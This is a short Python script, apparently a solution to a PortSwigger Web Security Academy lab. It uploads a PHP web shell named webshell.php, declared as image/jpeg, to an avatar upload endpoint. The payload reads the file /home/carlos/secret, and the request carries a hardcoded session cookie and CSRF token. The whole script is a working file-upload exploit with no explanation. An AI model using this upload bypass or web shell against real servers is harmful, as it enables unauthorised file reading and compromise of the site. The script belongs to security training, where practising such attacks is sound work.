import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell.php', "<?php echo file_get_contents('/home/carlos/secret');", "image/jpeg"),
    'csrf': "jceEZQqiBaO2Raue8Ma5HIsvJZjbErsk",
    'user': "wiener"
})

headers = {
    "Cookie": "session=ouPQveWk4Td9dZzD7a2AUYq1GGVLzgTE",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)